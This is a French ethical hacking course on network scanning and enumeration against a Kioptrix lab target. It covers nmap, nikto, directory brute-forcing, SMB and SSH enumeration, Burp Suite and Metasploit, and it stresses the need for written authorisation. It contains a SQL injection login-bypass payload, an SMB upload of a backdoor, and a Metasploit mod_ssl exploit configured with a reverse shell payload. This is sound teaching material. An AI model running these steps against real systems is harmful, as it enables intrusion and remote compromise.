# Cours : Scanning et Énumération en Ethical Hacking

## Introduction au Scanning et à l'Énumération

Le **scanning** est la deuxième phase du hacking éthique. Après avoir collecté des informations passives, on passe à une interaction directe avec la cible pour :
- Découvrir les machines actives sur le réseau
- Identifier les ports ouverts
- Déterminer les services et versions exécutés
- Énumérer les ressources accessibles (partages réseau, répertoires web, etc.)

**⚠️ Important** : Cette phase est **active et détectable**. Assurez-vous d'avoir l'autorisation écrite avant tout scan.

***

## Partie 1 : Découverte du réseau

### 1.1 Identification des machines actives

**Cas d'usage** : Trouver toutes les machines présentes sur un réseau local (ex: lab Kioptrix, environnement de pentest).

#### ARP-scan (rapide et efficace sur réseau local)

```bash
# Installation
sudo apt install arp-scan

# Scan de tout le réseau local
sudo arp-scan -l

# Résultat typique :
# 192.168.1.1    00:11:22:33:44:55    Cisco Systems
# 192.168.1.100  aa:bb:cc:dd:ee:ff    VMware
```

**Avantages** : Très rapide, fonctionne au niveau de la couche 2 (liaison de données), difficile à bloquer.

#### Netdiscover (scan actif ou passif)

```bash
# Installation
sudo apt install netdiscover

# Scan d'une plage IP spécifique
sudo netdiscover -r 192.168.1.0/24

# Mode passif (écoute uniquement, plus discret)
sudo netdiscover -p -r 192.168.1.0/24

# Résultat :
# IP              MAC                 Count   Len  Hostname
# 192.168.1.128   08:00:27:a1:b2:c3   1       60   kioptrix.local
```

**Quand utiliser quoi** :
- `arp-scan` : Rapide, pour découverte initiale
- `netdiscover` : Plus d'options, mode passif disponible

***

## Partie 2 : Scan de ports avec Nmap

**Nmap** (Network Mapper) est l'outil de référence pour le scan de ports et l'énumération de services.

### 2.1 Scan basique

```bash
# Installation
sudo apt install nmap

# Scan d'une machine
nmap 192.168.1.128

# Scan d'un réseau complet
nmap 192.168.1.0/24

# Scan de plusieurs cibles
nmap 192.168.1.1,100,128
```

### 2.2 Fonctionnement : Le TCP Three-Way Handshake

Nmap utilise le processus de connexion TCP pour détecter les ports ouverts :

1. **SYN** → Envoi d'un paquet SYN au port cible
2. **SYN-ACK** ← Si le port est ouvert, réponse SYN-ACK
3. **RST** → Nmap envoie RST (RESET) pour fermer la connexion sans l'établir complètement

**Résultat** : On sait que le port est ouvert sans créer de connexion complète (plus discret).

### 2.3 Types de scans et options de vitesse

```bash
# Scan SYN (par défaut, nécessite root)
sudo nmap -sS 192.168.1.128

# Scan de tous les ports (1-65535)
nmap -p- 192.168.1.128

# Scan de ports spécifiques
nmap -p 22,80,443,3306 192.168.1.128

# Options de vitesse (-T0 à -T5)
nmap -T1 192.168.1.128  # Paranoid : très lent, furtif
nmap -T3 192.168.1.128  # Normal (défaut)
nmap -T5 192.168.1.128  # Insane : très rapide, peut manquer des ports

# Scan UDP (plus lent, important pour DNS, SNMP)
sudo nmap -sU 192.168.1.128

# Combinaison TCP + UDP sur ports communs
sudo nmap -sS -sU -p 53,161,123 192.168.1.128
```

### 2.4 Détection de services et versions

```bash
# Détection de version des services
nmap -sV 192.168.1.128

# Résultat typique :
# PORT    STATE SERVICE     VERSION
# 22/tcp  open  ssh         OpenSSH 2.9p2
# 80/tcp  open  http        Apache httpd 1.3.20
# 139/tcp open  netbios-ssn Samba smbd

# Détection agressive (OS, version, scripts, traceroute)
sudo nmap -A 192.168.1.128

# Scripts NSE spécifiques
nmap --script vuln 192.168.1.128
nmap --script smb-enum-shares 192.168.1.128
```

### 2.5 Scan complet recommandé

```bash
# Scan complet pour pentest
sudo nmap -sS -sV -O -A -T4 -p- 192.168.1.128 -oN scan_complet.txt

# -sS : SYN scan
# -sV : Détection de version
# -O  : Détection OS
# -A  : Aggressive (scripts, traceroute)
# -T4 : Vitesse rapide
# -p- : Tous les ports
# -oN : Sauvegarde résultat en format normal
```

***

## Partie 3 : Énumération HTTP/HTTPS

### 3.1 Exploration manuelle

**Cas d'usage** : Comprendre l'application web avant le scan automatisé.

**Checklist manuelle** :
1. ✅ Naviguer sur toutes les pages
2. ✅ Inspecter le code source (commentaires, chemins cachés)
3. ✅ Tester les fonctionnalités (formulaires, uploads, recherche)
4. ✅ Analyser les cookies et headers HTTP (avec Burp Suite)
5. ✅ Vérifier robots.txt et sitemap.xml

### 3.2 Nikto - Scanner de vulnérabilités web

```bash
# Installation
sudo apt install nikto

# Scan basique
nikto -h http://192.168.1.128

# Scan HTTPS
nikto -h https://192.168.1.128

# Scan avec port spécifique
nikto -h http://192.168.1.128:8080

# Options utiles
nikto -h http://192.168.1.128 -o resultats.html -Format html
nikto -h http://192.168.1.128 -Tuning 6  # Test XSS uniquement

# Résultat typique :
# + Server: Apache/1.3.20
# + OSVDB-877: mod_ssl/2.8.4 - vulnerable to remote buffer overflow
# + /admin/: Admin directory found
```

**⚠️ Attention** : Nikto est très bruyant et sera détecté par les WAF (Web Application Firewalls) modernes. À utiliser uniquement avec autorisation.

### 3.3 Brute-forcing de répertoires

**Cas d'usage** : Découvrir des répertoires et fichiers cachés (admin, backup, config, uploads).

#### Dirb (simple et efficace)

```bash
# Installation
sudo apt install dirb

# Scan basique avec wordlist par défaut
dirb http://192.168.1.128

# Avec wordlist personnalisée
dirb http://192.168.1.128 /usr/share/wordlists/dirb/common.txt

# Ignorer certaines réponses (codes HTTP)
dirb http://192.168.1.128 -N 404

# Avec extension spécifique
dirb http://192.168.1.128 -X .php,.html,.txt
```

#### Dirbuster (GUI, plus d'options)

```bash
# Lancement
dirbuster

# Configuration GUI :
# 1. Target URL: http://192.168.1.128
# 2. Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# 3. File extensions: php,html,txt,bak (basé sur technologies détectées)
# 4. Threads: 10-20 (selon vitesse souhaitée)
```

**Astuce** : Limiter les extensions selon les technologies identifiées avec WhatWeb (ex: .php pour Apache+PHP, .aspx pour IIS+ASP.NET).

#### Gobuster (rapide, moderne)

```bash
# Installation
sudo apt install gobuster

# Scan de répertoires
gobuster dir -u http://192.168.1.128 -w /usr/share/wordlists/dirb/common.txt

# Avec extensions
gobuster dir -u http://192.168.1.128 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Scan DNS (subdomains)
gobuster dns -d entreprise.com -w /usr/share/wordlists/dnsmap.txt

# Options utiles
gobuster dir -u http://192.168.1.128 -w wordlist.txt -t 50 -o resultats.txt
# -t 50 : 50 threads (rapide)
# -o : sauvegarde résultats
```

**Recommandation** : Gobuster est le plus rapide, Dirbuster le plus configurable, Dirb le plus simple.

***

## Partie 4 : Burp Suite - Analyse avancée

### 4.1 Utilisation du Repeater

**Cas d'usage** : Modifier et renvoyer des requêtes HTTP pour tester des paramètres, chercher des injections SQL/XSS.

**Workflow** :
1. Intercepter une requête dans l'onglet **Proxy**
2. Clic droit → **Send to Repeater**
3. Dans l'onglet **Repeater** :
   - Modifier les paramètres (GET/POST)
   - Cliquer sur **Send**
   - Analyser la réponse en temps réel
4. Tester différentes valeurs sans recharger le navigateur

**Exemple** :
```http
# Requête originale
GET /login.php?user=admin&pass=123 HTTP/1.1

# Test SQL injection dans Repeater
GET /login.php?user=admin'OR'1'='1&pass=123 HTTP/1.1
```

### 4.2 Gestion des cibles (Target tab)

```
1. Onglet Target → Site map
2. Ajouter une cible : clic droit sur un domaine → Add to scope
3. Filtrer : Proxy → Options → Intercept Client Requests
   → "And URL is in target scope"
```

**Avantage** : Éviter d'intercepter du trafic hors scope (publicités, CDN, etc.).

***

## Partie 5 : Énumération SMB (Server Message Block)

**SMB** : Protocole de partage de fichiers et imprimantes réseau (ports 139, 445). Historiquement vulnérable (EternalBlue, MS17-010).

### 5.1 Lister les partages SMB

```bash
# Installation
sudo apt install smbclient

# Lister les partages (avec authentification anonyme)
smbclient -L \\\\192.168.1.128\\

# Alternative syntaxe
smbclient -L //192.168.1.128/

# Avec credentials
smbclient -L //192.168.1.128/ -U utilisateur

# Résultat typique :
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# IPC$            IPC       Remote IPC
```

### 5.2 Se connecter à un partage

```bash
# Connexion au partage ADMIN$
smbclient \\\\192.168.1.128\\ADMIN$

# Alternative
smbclient //192.168.1.128/ADMIN$

# Une fois connecté (commandes type FTP)
smb: \> ls           # Lister fichiers
smb: \> cd dossier   # Changer de répertoire
smb: \> get fichier.txt  # Télécharger
smb: \> put backdoor.exe # Uploader
smb: \> exit
```

### 5.3 Énumération SMB avec Nmap

```bash
# Scripts SMB Nmap
nmap --script smb-enum-shares -p 445 192.168.1.128
nmap --script smb-enum-users -p 445 192.168.1.128
nmap --script smb-os-discovery -p 445 192.168.1.128
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.128  # EternalBlue
```

### 5.4 Enum4linux (outil dédié)

```bash
# Installation
sudo apt install enum4linux

# Énumération complète
enum4linux -a 192.168.1.128

# -a : tout (users, shares, groups, password policy)
```

***

## Partie 6 : Énumération SSH

### 6.1 Test de connexion

```bash
# Tentative de connexion basique
ssh 192.168.1.128

# Résultat possible : erreur d'algorithme de clé
# "Unable to negotiate with 192.168.1.128 port 22: no matching key exchange method found"
```

### 6.2 Connexion avec algorithmes legacy

```bash
# Forcer un algorithme spécifique (ancien serveur SSH)
ssh 192.168.1.128 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1

# Avec cipher spécifique
ssh 192.168.1.128 -c aes128-cbc

# Verbosité pour debug
ssh -vvv 192.168.1.128
```

### 6.3 Énumération SSH avec Nmap

```bash
# Détection version SSH
nmap -p 22 -sV 192.168.1.128

# Scripts SSH Nmap
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.1.128
nmap --script ssh2-enum-algos -p 22 192.168.1.128
```

**Cas d'usage** : Identifier des versions SSH vulnérables (OpenSSH < 7.4, etc.).

***

## Partie 7 : Metasploit Framework

**Metasploit** : Framework d'exploitation contenant des milliers d'exploits, scanners, et outils post-exploitation.

### 7.1 Lancement et recherche

```bash
# Lancement de Metasploit
msfconsole

# Recherche d'exploits
msf6 > search apache
msf6 > search type:exploit platform:linux smb
msf6 > search mod_ssl

# Résultat typique :
# 0  exploit/unix/http/apache_mod_ssl  2002-04-01  Apache mod_ssl < 2.8.7 OpenSSL
```

### 7.2 Utilisation d'un exploit

```bash
# Sélectionner un exploit par numéro ou chemin
msf6 > use 0
# OU
msf6 > use exploit/unix/http/apache_mod_ssl

# Afficher les options requises
msf6 exploit(unix/http/apache_mod_ssl) > options

# Configurer la cible
msf6 exploit(unix/http/apache_mod_ssl) > set RHOSTS 192.168.1.128
msf6 exploit(unix/http/apache_mod_ssl) > set RPORT 443

# Vérifier la configuration
msf6 exploit(unix/http/apache_mod_ssl) > show options

# Lancer l'exploit
msf6 exploit(unix/http/apache_mod_ssl) > run
# OU
msf6 exploit(unix/http/apache_mod_ssl) > exploit
```

### 7.3 Modules auxiliaires (scanning)

```bash
# Scanner SMB
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

# Scanner SSH
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.128
msf6 auxiliary(scanner/ssh/ssh_version) > run
```

***

## Partie 8 : Recherche d'exploits

### 8.1 Sources d'exploits

Après avoir identifié une version vulnérable (ex: mod_ssl 2.8.4), chercher des exploits :

**Exploit-DB** (exploit-db.com)
```bash
# En ligne de commande
searchsploit mod_ssl 2.8.4
searchsploit apache 1.3.20

# Copier un exploit
searchsploit -m 47080
```

**GitHub**
```
# Recherche : "mod_ssl 2.8.4 exploit"
# Vérifier : date, langage, instructions
```

**Rapid7 / Metasploit Database**
```
# rapid7.com/db
# Recherche par CVE, service, version
```

### 8.2 Exemple : Exploiter mod_ssl 2.8.4

```bash
# 1. Recherche Metasploit
msf6 > search mod_ssl

# 2. Utilisation
msf6 > use exploit/unix/http/apache_mod_ssl

# 3. Configuration
msf6 exploit(unix/http/apache_mod_ssl) > set RHOSTS 192.168.1.128
msf6 exploit(unix/http/apache_mod_ssl) > set RPORT 443
msf6 exploit(unix/http/apache_mod_ssl) > set SSL true

# 4. Choix du payload
msf6 exploit(unix/http/apache_mod_ssl) > show payloads
msf6 exploit(unix/http/apache_mod_ssl) > set PAYLOAD linux/x86/shell_reverse_tcp
msf6 exploit(unix/http/apache_mod_ssl) > set LHOST 192.168.1.50  # Votre IP

# 5. Exploitation
msf6 exploit(unix/http/apache_mod_ssl) > exploit
```

***

## Méthodologie de Scanning (checklist)

1. ✅ **Découverte réseau** : arp-scan, netdiscover
2. ✅ **Scan de ports** : nmap -sS -sV -A -p-
3. ✅ **Énumération HTTP** : Navigation manuelle, nikto, gobuster
4. ✅ **Énumération SMB** : smbclient, enum4linux, nmap scripts
5. ✅ **Énumération SSH** : Connexion, version, algorithmes
6. ✅ **Analyse Burp Suite** : Intercepter, Repeater, Target scope
7. ✅ **Recherche exploits** : searchsploit, exploit-db, Metasploit
8. ✅ **Documentation** : Noter TOUS les résultats pour exploitation
